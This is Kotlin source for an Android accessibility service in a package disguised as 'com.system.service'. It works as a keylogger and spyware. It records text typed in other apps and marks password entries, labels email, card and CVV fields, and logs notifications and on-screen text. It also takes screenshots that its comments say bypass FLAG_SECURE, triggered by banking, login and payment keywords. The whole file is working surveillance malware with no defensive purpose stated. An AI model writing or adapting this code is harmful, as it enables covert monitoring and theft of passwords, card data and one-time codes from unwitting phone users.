package com.system.service.services

import android.accessibilityservice.AccessibilityService
import android.os.Build
import android.view.KeyEvent
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.system.service.core.Config
import com.system.service.core.Storage
import com.system.service.monitor.ScreenCapture
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.Timer
import java.util.TimerTask
import com.system.service.core.MonitorCore

/**
 * Accessibility Service — the Android equivalent of Windows keyboard hooks.
 * Captures text input events, window changes, screen content, and takes
 * screenshots that BYPASS FLAG_SECURE (API 30+).
 *
 * REQUIRES: User must manually enable in Settings → Accessibility.
 */
class InputAccessibilityService : AccessibilityService() {

    companion object {
        @Volatile
        var instance: InputAccessibilityService? = null
            private set
    }

    private var lastWindowTitle = ""
    private var lastPackageName = ""
    private var textBuffer = StringBuilder()
    private var bufferWindowContext = ""
    private var bufferTimestamp = ""
    private var lastCapturedText = ""
    private var lastEventText = ""

    // Periodic flush timer
    private var flushTimer: Timer? = null

    // Screenshot trigger keywords (same as desktop)
    private val sensitiveKeywords = listOf(
        "login", "signin", "sign in", "password", "bank", "paypal",
        "checkout", "auth", "credential", "verify", "account",
        "billing", "submit", "payment", "wallet", "transfer",
        "pin", "otp", "2fa", "passcode", "unlock"
    )

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this

        MonitorCore.start(applicationContext)

        // Start periodic buffer flush (every 15 seconds, same as desktop ticker)
        flushTimer = Timer("FlushTimer", true)
        flushTimer?.scheduleAtFixedRate(object : TimerTask() {
            override fun run() {
                flushBuffer()
            }
        }, 15000, 15000)

        log("[System] Accessibility Service Connected (Screenshot Bypass Active)")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null || MonitorCore.isPaused) return

        when (event.eventType) {
            // ── Window State Changed (app/activity switch) ──
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                handleWindowChange(event)
            }

            // ── Text Changed (user typing) ──
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                handleTextInput(event)
            }

            // ── View Focused (field selection) ──
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                handleViewFocus(event)
            }

            // ── View Clicked (button presses, link taps) ──
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                handleViewClick(event)
            }

            // ── Window Content Changed ──
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                val pkg = event.packageName?.toString() ?: return
                if (pkg != packageName && pkg != lastPackageName) {
                    lastPackageName = pkg
                }
            }

            // ── Notification Events ──
            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
                handleNotification(event)
            }
        }
    }

    /**
     * onKeyEvent — captures hardware key presses (physical keyboards, some soft keys).
     * This catches events that TYPE_VIEW_TEXT_CHANGED might miss.
     */
    override fun onKeyEvent(event: KeyEvent?): Boolean {
        if (event == null || MonitorCore.isPaused) return false

        if (event.action == KeyEvent.ACTION_DOWN) {
            val key = mapKeyEvent(event)
            if (key.isNotEmpty()) {
                val windowCtx = if (bufferWindowContext.isNotBlank()) bufferWindowContext else lastWindowTitle
                if (bufferWindowContext.isBlank()) {
                    bufferWindowContext = windowCtx
                    bufferTimestamp = timestamp()
                }
                textBuffer.append(key)

                if (textBuffer.length > 500) {
                    flushBuffer()
                }
            }
        }
        return false // Don't consume the event
    }

    override fun onInterrupt() {
        flushBuffer()
    }

    override fun onDestroy() {
        flushBuffer()
        flushTimer?.cancel()
        instance = null
        super.onDestroy()
    }

    // ── Event Handlers ──

    private fun handleWindowChange(event: AccessibilityEvent) {
        val pkg = event.packageName?.toString() ?: ""
        val cls = event.className?.toString() ?: ""
        val title = event.text?.joinToString(" ") ?: ""

        if (pkg == packageName) return // Ignore self

        val windowInfo = buildWindowContext(pkg, title, cls)

        if (windowInfo != lastWindowTitle) {
            flushBuffer()
            lastWindowTitle = windowInfo
            lastPackageName = pkg
            bufferWindowContext = windowInfo
            bufferTimestamp = timestamp()

            log("[${timestamp()}] [FOCUS] $windowInfo")

            // Trigger screenshot check for sensitive windows
            ScreenCapture.checkAndCapture(windowInfo, true)

            // Deep scan: try to read all visible text on the new screen
            scanWindowContent(event)
        }
    }

    private fun handleTextInput(event: AccessibilityEvent) {
        val text = event.text?.joinToString("") ?: return
        if (text.isBlank() || text == lastEventText) return
        lastEventText = text

        // Detect the delta (what was actually typed)
        val beforeText = event.beforeText?.toString() ?: ""
        val currentText = text

        val typed = when {
            currentText.length > beforeText.length -> {
                val diff = currentText.length - beforeText.length
                if (diff > 2) "[PASTE/AUTO: $currentText]" else currentText.takeLast(diff)
            }
            currentText.length < beforeText.length -> "[DEL]"
            else -> return
        }

        // Build context
        val windowCtx = if (bufferWindowContext.isNotBlank()) bufferWindowContext else lastWindowTitle
        if (bufferWindowContext.isBlank()) {
            bufferWindowContext = windowCtx
            bufferTimestamp = timestamp()
        }

        // Check if we're typing in a password field
        val node = event.source
        if (node != null) {
            if (node.isPassword) {
                textBuffer.append("[PWD:$typed]")
            } else {
                textBuffer.append(typed)
            }
            node.recycle()
        } else {
            textBuffer.append(typed)
        }

        // Flush if buffer gets large
        if (textBuffer.length > 500) {
            flushBuffer()
        }

        // Trigger screenshot on sensitive input
        ScreenCapture.checkAndCapture(windowCtx, false)
    }

    private fun handleViewFocus(event: AccessibilityEvent) {
        val node = event.source ?: return
        val pkg = event.packageName?.toString() ?: ""
        if (pkg == packageName) { node.recycle(); return }

        val hint = node.hintText?.toString()
            ?: node.contentDescription?.toString()
            ?: node.text?.toString()
            ?: ""

        val viewId = node.viewIdResourceName ?: ""

        if (hint.isNotBlank() || node.isPassword) {
            val fieldType = when {
                node.isPassword -> "🔑 PASSWORD"
                viewId.contains("email", true) || hint.contains("email", true) -> "📧 EMAIL"
                viewId.contains("user", true) || hint.contains("user", true) -> "👤 USERNAME"
                viewId.contains("phone", true) || hint.contains("phone", true) -> "📱 PHONE"
                viewId.contains("card", true) || hint.contains("card", true) -> "💳 CARD"
                viewId.contains("cvv", true) || hint.contains("cvv", true) -> "🔒 CVV"
                else -> "FIELD"
            }
            log("[${timestamp()}] [$fieldType] $pkg → $hint")

            // Trigger screenshot for password/card fields
            if (node.isPassword || fieldType.contains("CARD") || fieldType.contains("CVV")) {
                ScreenCapture.checkAndCapture("$pkg - $hint", true)
            }
        }
        node.recycle()
    }

    private fun handleViewClick(event: AccessibilityEvent) {
        val node = event.source ?: return
        val pkg = event.packageName?.toString() ?: ""
        if (pkg == packageName) { node.recycle(); return }

        val text = node.text?.toString() ?: node.contentDescription?.toString() ?: ""
        val cls = event.className?.toString()?.substringAfterLast(".") ?: ""

        // Log button clicks that might be submit/login buttons
        if (text.isNotBlank() && (cls.contains("Button", true) || cls.contains("TextView", true))) {
            val lower = text.lowercase()
            val isImportant = sensitiveKeywords.any { lower.contains(it) } ||
                    lower.contains("sign") || lower.contains("log") ||
                    lower.contains("submit") || lower.contains("continue") ||
                    lower.contains("next") || lower.contains("send") ||
                    lower.contains("confirm") || lower.contains("pay")

            if (isImportant) {
                log("[${timestamp()}] [CLICK] $pkg → \"$text\"")
                ScreenCapture.checkAndCapture("$pkg - $text", true)
            }
        }
        node.recycle()
    }

    private fun handleNotification(event: AccessibilityEvent) {
        val pkg = event.packageName?.toString() ?: ""
        val text = event.text?.joinToString(" ") ?: return
        if (text.isBlank() || pkg == packageName) return

        log("[${timestamp()}] [NOTIF] $pkg: $text")
    }

    /**
     * Deep scan: traverse the accessibility tree to find all visible text on screen.
     * Used on window changes to capture form labels, button text, etc.
     */
    private fun scanWindowContent(event: AccessibilityEvent) {
        try {
            val root = rootInActiveWindow ?: return
            val texts = mutableListOf<String>()
            traverseNode(root, texts, 0)

            if (texts.isNotEmpty()) {
                val content = texts.take(20).joinToString(" | ")
                if (content.length > 10) {
                    log("[${timestamp()}] [SCREEN] ${lastPackageName}: $content")
                }
            }
        } catch (_: Exception) { }
    }

    private fun traverseNode(node: AccessibilityNodeInfo?, texts: MutableList<String>, depth: Int) {
        if (node == null || depth > 8 || texts.size > 20) return

        val text = node.text?.toString()?.trim()
        if (!text.isNullOrBlank() && text.length in 2..200) {
            texts.add(text)
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            traverseNode(child, texts, depth + 1)
            child.recycle()
        }
    }

    // ── Buffer Management ──

    @Synchronized
    private fun flushBuffer() {
        if (textBuffer.isEmpty()) return

        val ctx = if (bufferWindowContext.isNotBlank()) bufferWindowContext else "Unknown"
        val ts = if (bufferTimestamp.isNotBlank()) bufferTimestamp else timestamp()
        val logLine = "[$ts] [$ctx] ${textBuffer}"

        log(logLine)
        textBuffer.clear()
        bufferWindowContext = ""
        bufferTimestamp = ""
    }

    // ── Key Mapping ──

    private fun mapKeyEvent(event: KeyEvent): String {
        return when (event.keyCode) {
            KeyEvent.KEYCODE_DEL -> "[BACKSPACE]"
            KeyEvent.KEYCODE_ENTER, KeyEvent.KEYCODE_NUMPAD_ENTER -> "[ENTER]"
            KeyEvent.KEYCODE_TAB -> "[TAB]"
            KeyEvent.KEYCODE_SPACE -> " "
            KeyEvent.KEYCODE_ESCAPE -> "[ESC]"
            KeyEvent.KEYCODE_SHIFT_LEFT, KeyEvent.KEYCODE_SHIFT_RIGHT -> ""
            KeyEvent.KEYCODE_CTRL_LEFT, KeyEvent.KEYCODE_CTRL_RIGHT -> ""
            KeyEvent.KEYCODE_ALT_LEFT, KeyEvent.KEYCODE_ALT_RIGHT -> ""
            KeyEvent.KEYCODE_CAPS_LOCK -> "[CAPSLOCK]"
            KeyEvent.KEYCODE_DPAD_UP -> "[UP]"
            KeyEvent.KEYCODE_DPAD_DOWN -> "[DOWN]"
            KeyEvent.KEYCODE_DPAD_LEFT -> "[LEFT]"
            KeyEvent.KEYCODE_DPAD_RIGHT -> "[RIGHT]"
            KeyEvent.KEYCODE_FORWARD_DEL -> "[DELETE]"
            KeyEvent.KEYCODE_COPY -> "[COPY]"
            KeyEvent.KEYCODE_PASTE -> "[PASTE]"
            KeyEvent.KEYCODE_CUT -> "[CUT]"
            else -> {
                val ch = event.unicodeChar
                if (ch > 0) String(charArrayOf(ch.toChar())) else ""
            }
        }
    }

    // ── Helpers ──

    private fun buildWindowContext(pkg: String, title: String, cls: String): String {
        val appName = try {
            val pm = packageManager
            val appInfo = pm.getApplicationInfo(pkg, 0)
            pm.getApplicationLabel(appInfo).toString()
        } catch (_: Exception) {
            pkg.substringAfterLast(".")
        }
        return if (title.isNotBlank() && title != appName) "$appName - $title" else appName
    }

    private fun log(content: String) {
        try {
            if (MonitorCore.isRunning) {
                MonitorCore.enqueueLog(content)
            } else {
                Storage.init(applicationContext)
                Storage.appendLog(content)
            }
        } catch (_: Exception) { }
    }

    private fun timestamp(): String {
        return SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
    }
}
